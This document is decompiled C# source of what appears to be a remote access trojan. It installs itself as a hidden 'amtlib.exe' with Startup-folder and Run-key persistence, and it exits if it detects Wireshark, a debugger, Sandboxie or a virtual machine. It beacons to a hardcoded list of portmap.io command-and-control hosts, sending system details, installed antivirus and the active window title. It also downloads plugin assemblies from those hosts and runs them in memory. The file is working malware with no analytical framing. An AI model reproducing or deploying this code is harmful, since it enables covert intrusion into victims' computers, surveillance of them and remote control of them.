using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace EX96ON9PA;

public static class ET9BWXTT2LE
{
	public static string Rec;

	public static bool AZ;

	public static TcpClient CCP;

	public static bool CZ;

	public static int IA;

	public static int AI;

	public static string[] Hosts;

	public static string[] Ports;

	public static string ID;

	public static string MUTEX;

	public static int H;

	public static int P;

	public static string SPL;

	public static string Papp;

	public static ComputerInfo DI;

	public static string Key;

	public static Mutex MT;

	[STAThread]
	public static void Main()
	{
		try
		{
			using Process process = Process.GetCurrentProcess();
			process.PriorityClass = ProcessPriorityClass.AboveNormal;
		}
		catch
		{
		}
		try
		{
			File.SetAttributes(Papp, FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
		RUN();
	}

	public static void RUN()
	{
		new Thread(Bypass).Start();
		new Thread(RCB, 1).Start();
		new Thread(Pin).Start();
		new Thread(INS).Start();
	}

	public static void Pin()
	{
		while (true)
		{
			if (IA == 0)
			{
				AI++;
			}
			Thread.Sleep(1);
		}
	}

	public static void INS()
	{
		Thread.Sleep(9000);
		try
		{
			MT = new Mutex(initiallyOwned: true, MUTEX, out AZ);
			if (!AZ)
			{
				Environment.Exit(0);
				MT.ReleaseMutex();
			}
		}
		catch
		{
		}
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\amtlib.exe";
			File.Copy(Papp, text, overwrite: true);
			Process.Start(text);
			Environment.Exit(0);
		}
		catch
		{
		}
		try
		{
			string destFileName = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\amtlib.exe";
			File.Copy(Papp, destFileName, overwrite: true);
		}
		catch
		{
		}
		try
		{
			IR("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "amtlib", Papp);
		}
		catch
		{
		}
	}

	public static void data(byte[] BB)
	{
		string[] array = Strings.Split(BS(BB), Key, -1, (CompareMethod)1);
		if (array[0] == "PVC")
		{
			IA = 0;
			Send("PVC");
		}
		else if (array[0] == "PWC")
		{
			IA = 1;
			Send("PWC" + Key + AI);
			AI = 0;
			Send("GAW" + Key + GAW());
		}
		else if (array[0] == "CIN")
		{
			Send("CIN" + Key + Hosts[H] + Key + Ports[P] + Key + Rec + Key + GetCreationDate(Application.get_ExecutablePath()) + Key + Application.get_ExecutablePath() + Key + MUTEX + Key + "False" + Key + "True" + Key + "True" + Key + "True" + Key + "True" + Key + "True" + Key + "True" + Key + "Above Normal" + Key + "True" + Key + "True" + Key + "False");
		}
		else if (array[0] == "IE")
		{
			if (Registry.CurrentUser.OpenSubKey("Software\\" + Encode(MUTEX) + "\\" + array[1], writable: true) != null)
			{
				try
				{
					INV(Hosts[H], Ports[P], array[4], array[5], Encode(Decode(ID) + "_" + HWD()), Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\" + Encode(MUTEX) + "\\\\" + array[1], array[1], null)!.ToString(), int.Parse(array[2]), Convert.ToBoolean(array[3]), array[1], B: true);
					return;
				}
				catch
				{
					Send("GPL" + Key + array[5] + Key + array[1] + Key + "false");
					return;
				}
			}
			Send("GPL" + Key + array[5] + Key + array[1] + Key + "false");
		}
		else if (array[0] == "LP")
		{
			INV(Hosts[H], Ports[P], array[1], array[2], Encode(Decode(ID) + "_" + HWD()), array[3], int.Parse(array[4]), Convert.ToBoolean(array[5]), array[6], Convert.ToBoolean(array[7]));
		}
		else if (array[0] == "UNV")
		{
			object obj2 = Interaction.CallByName(LA(array[1]), Encoding.Default.GetString(new byte[7] { 71, 101, 116, 84, 121, 112, 101 }), (CallType)1, new object[1] { array[2] });
			object obj3 = Interaction.CallByName(obj2, Encoding.Default.GetString(new byte[9] { 71, 101, 116, 77, 101, 116, 104, 111, 100 }), (CallType)1, new object[1] { Encoding.Default.GetString(new byte[3] { 85, 78, 73 }) });
			Interaction.CallByName(obj3, Encoding.Default.GetString(new byte[6] { 73, 110, 118, 111, 107, 101 }), (CallType)1, new object[2]
			{
				null,
				new object[43]
				{
					Encode(MUTEX),
					array[0],
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					array[4],
					array[5],
					Papp,
					array[6],
					array[7],
					array[8],
					array[9],
					array[10],
					array[11],
					array[12],
					array[13]
				}
			});
		}
	}

	public static void INV(string H, string P, string N, string C, string ID, string Bytes, int S, bool M, string MD5, bool B)
	{
		byte[] bytes = new byte[14]
		{
			67, 114, 101, 97, 116, 101, 73, 110, 115, 116,
			97, 110, 99, 101
		};
		byte[] bytes2 = new byte[5] { 83, 116, 97, 114, 116 };
		object obj = Interaction.CallByName(LA(Bytes), Encoding.Default.GetString(bytes), (CallType)1, new object[1] { N + "." + C });
		Interaction.CallByName(obj, Encoding.Default.GetString(bytes2), (CallType)1, new object[6] { ID, S, H, P, Key, SPL });
		if (!M)
		{
			return;
		}
		try
		{
			if (Registry.CurrentUser.OpenSubKey("Software\\" + Encode(MUTEX) + "\\" + MD5, writable: true) == null)
			{
				IR("HKEY_CURRENT_USER\\SOFTWARE\\" + Encode(MUTEX) + "\\" + MD5, MD5, Bytes);
			}
		}
		catch
		{
		}
		if (!B)
		{
			IR("HKEY_CURRENT_USER\\SOFTWARE\\" + Encode(MUTEX) + "\\" + MD5, MD5, Bytes);
		}
	}

	public static object LA(string B)
	{
		byte[] bytes = new byte[4] { 76, 111, 97, 100 };
		object currentDomain = AppDomain.CurrentDomain;
		return Interaction.CallByName(currentDomain, Encoding.Default.GetString(bytes), (CallType)1, new object[1] { Decompress(Convert.FromBase64String(B)) });
	}

	public static void IR(string P, string N, string B)
	{
		try
		{
			Registry.SetValue(P, N, B);
		}
		catch
		{
		}
	}

	public static void RCB()
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		while (true)
		{
			try
			{
				try
				{
					EmptyWorkingSet(Process.GetCurrentProcess().Handle);
				}
				catch
				{
				}
			}
			catch
			{
			}
			try
			{
				if (CCP != null && CCP.Client.Connected && CZ)
				{
					num++;
					if (num <= 150)
					{
						goto IL_008c;
					}
					num = 0;
					if (!(CCP.Client.Poll(-1, SelectMode.SelectRead) & (CCP.Client.Available <= 0)))
					{
						goto IL_008c;
					}
				}
				goto end_IL_0022;
				IL_008c:
				if (CCP.Available > 0)
				{
					byte[] array = new byte[CCP.Available];
					CCP.Client.Receive(array, 0, array.Length, SocketFlags.None);
					memoryStream.Write(array, 0, array.Length);
					while (BS(memoryStream.ToArray()).Contains(SPL))
					{
						_003C_003Ec__DisplayClass1 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass1();
						CS_0024_003C_003E8__locals0.A = (Array[])fx(memoryStream.ToArray(), SPL);
						Thread thread = new Thread((ThreadStart)delegate
						{
							data((byte[])CS_0024_003C_003E8__locals0.A[0]);
						});
						thread.Start();
						memoryStream.Dispose();
						memoryStream = new MemoryStream();
						if (CS_0024_003C_003E8__locals0.A.Length == 2)
						{
							memoryStream.Write((byte[])CS_0024_003C_003E8__locals0.A[1], 0, ((byte[])CS_0024_003C_003E8__locals0.A[1]).Length);
							continue;
						}
						break;
					}
				}
				goto IL_0167;
				end_IL_0022:;
			}
			catch
			{
			}
			while (true)
			{
				try
				{
					try
					{
						EmptyWorkingSet(Process.GetCurrentProcess().Handle);
					}
					catch
					{
					}
				}
				catch
				{
				}
				CZ = false;
				try
				{
					CCP.Client.Disconnect(reuseSocket: false);
				}
				catch
				{
				}
				try
				{
					memoryStream.Dispose();
				}
				catch
				{
				}
				memoryStream = new MemoryStream();
				bool flag = false;
				for (int i = 0; i <= Hosts.Length - 2; i++)
				{
					try
					{
						CCP = new TcpClient();
						CCP.ReceiveTimeout = -1;
						CCP.SendTimeout = -1;
						CCP.SendBufferSize = 999999;
						CCP.ReceiveBufferSize = 999999;
						num = 0;
						CCP.Client.Connect(Hosts[i], Convert.ToInt16(Ports[i]));
						CZ = true;
						Send("Inf" + Key + ID + Key + Encode("_" + HWD()) + Key + IP() + Key + Encode(Environment.MachineName + " / " + Environment.UserName) + Key + CIVC() + Key + Encode(DI.get_OSFullName() + " " + OP()) + Key + Encode(MP()) + Key + DI.get_TotalPhysicalMemory() + Key + GetProduct("Select * from AntiVirusProduct") + Key + GetProduct("SELECT * FROM FirewallProduct") + Key + GAW() + Key + GetCreationDate(Application.get_ExecutablePath()));
						H = i;
						P = i;
						flag = true;
					}
					catch
					{
						Thread.Sleep(int.Parse(Rec));
						H = 0;
						P = 0;
						continue;
					}
					goto end_IL_0172;
				}
				if (!flag)
				{
					break;
				}
				flag = false;
				continue;
				end_IL_0172:
				break;
			}
			continue;
			IL_0167:
			Thread.Sleep(1);
		}
	}

	public static void Send(byte[] b)
	{
		if (!CZ)
		{
			return;
		}
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(b, 0, b.Length);
			memoryStream.Write(SB(SPL), 0, SPL.Length);
			CCP.Client.SendBufferSize = b.Length;
			CCP.Client.Poll(-1, SelectMode.SelectWrite);
			CCP.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			memoryStream.Dispose();
		}
		catch
		{
			CZ = false;
		}
	}

	public static string GetCreationDate(string sPath)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		Computer val = new Computer();
		FileInfo fileInfo = ((ServerComputer)val).get_FileSystem().GetFileInfo(sPath);
		return fileInfo.CreationTimeUtc.Date.ToShortDateString();
	}

	public static void Send(string S)
	{
		Send(SB(S));
	}

	public static string IP()
	{
		try
		{
			return ((IPAddress)Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0)).ToString();
		}
		catch
		{
			return "????";
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA(string string_0, string string_1, int int_0, ref int int_1, ref int int_2, ref int int_3, string string_2, int int_4);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_0);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, string lpszName, int cbName, string lpszVer, int cbVer);

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(IntPtr hProcess);

	[DllImport("kernel32")]
	private static extern bool IsDebuggerPresent();

	private static bool smethod_0()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (process.MainWindowTitle.Equals("The Wireshark Network Analyzer"))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool smethod_1()
	{
		long num = Environment.TickCount;
		Thread.Sleep(500);
		long num2 = Environment.TickCount;
		if (num2 - num < 500L)
		{
			return true;
		}
		return false;
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	private static bool smethod_2()
	{
		if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
		{
			return true;
		}
		return false;
	}

	public static bool ANTIVM()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		bool result = false;
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard");
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item("Manufacturer").ToString()!.ToLower() == "microsoft corporation".ToLower();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void Bypass()
	{
		if (smethod_0())
		{
			Environment.Exit(0);
		}
		if (IsDebuggerPresent())
		{
			Environment.Exit(0);
		}
		if (smethod_1())
		{
			Environment.Exit(0);
		}
		if (smethod_2())
		{
			Environment.Exit(0);
		}
		if (ANTIVM())
		{
			Environment.Exit(0);
		}
	}

	public static string HWD()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = 0;
			GetVolumeInformationA(string_, string_2, 0, ref int_3, ref int_, ref int_2, string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch
		{
			return "ERR";
		}
	}

	public static string CIVC()
	{
		string lpszVer = null;
		string lpszName = Strings.Space(100);
		try
		{
			for (int i = 0; i <= 4; i++)
			{
				if (capGetDriverDescriptionA((short)i, lpszName, 100, lpszVer, 100))
				{
					return "Yes";
				}
			}
		}
		catch
		{
		}
		return "No";
	}

	public static string OP()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					return Convert.ToInt32(((ManagementBaseObject)val).get_Item("AddressWidth")).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return "????";
		}
		return "????";
	}

	public static string GetProduct(string Product)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\SecurityCenter" + (DI.get_OSFullName().Contains("XP") ? "" : "2").ToString(), Product).Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					text += ((ManagementBaseObject)val).get_Item("displayName");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (text != string.Empty)
			{
				return Encode(text);
			}
			return Encode("N/A");
		}
		catch
		{
			return Encode("N/A");
		}
	}

	public static string MP()
	{
		try
		{
			return Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", null)!.ToString();
		}
		catch
		{
			return "????";
		}
	}

	public static string GAW()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		GetWindowText(GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
		return Encode(stringBuilder.ToString());
	}

	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static Array fx(byte[] b, string WRD)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), WRD, -1, (CompareMethod)1);
		memoryStream.Write(b, 0, array[0].Length);
		memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
		list.Add(memoryStream.ToArray());
		list.Add(memoryStream2.ToArray());
		memoryStream.Dispose();
		memoryStream2.Dispose();
		return list.ToArray();
	}

	public static byte[] Decompress(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}

	public static string Encode(string Input)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(Input));
	}

	public static string Decode(string Input)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(Input));
	}

	static ET9BWXTT2LE()
	{
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		Class2.RpwqH1RzL8Vrr();
		Rec = "1500";
		AZ = false;
		CCP = null;
		CZ = false;
		IA = 1;
		AI = 0;
		Hosts = Strings.Split("RawCostura80-56041.portmap.io,ELHombre3176-56154.portmap.io,badass3456-45555.portmap.host,Guinobatan710-58369.portmap.host,Shenron481-46831.portmap.io,Kurama98-28588.portmap.host,VestigialLorde041-21462.portmap.io,OrationSeas7145-59097.portmap.host,Baguvix918-26613.portmap.io,ShiroSensei2486-37140.portmap.host,PearlHarbor953-54421.portmap.host,ZuckkyRabi198-60433.portmap.io,Impala701-47727.portmap.host,Mongrel38-43817.portmap.host,haroborobo971-30110.portmap.host,,,", ",", -1, (CompareMethod)1);
		Ports = Strings.Split("56041,56154,45555,58369,46831,28588,21462,59097,26613,37140,54421,60433,47727,43817,30110,,,", ",", -1, (CompareMethod)1);
		ID = "T2ZmaWNlMTQ=";
		MUTEX = "DZ_XeTuM_C2J85E8JA1EXDKC";
		H = 0;
		P = 0;
		SPL = "^_*]M[*_^";
		Papp = Application.get_ExecutablePath();
		DI = new ComputerInfo();
		Key = "4859";
	}
}
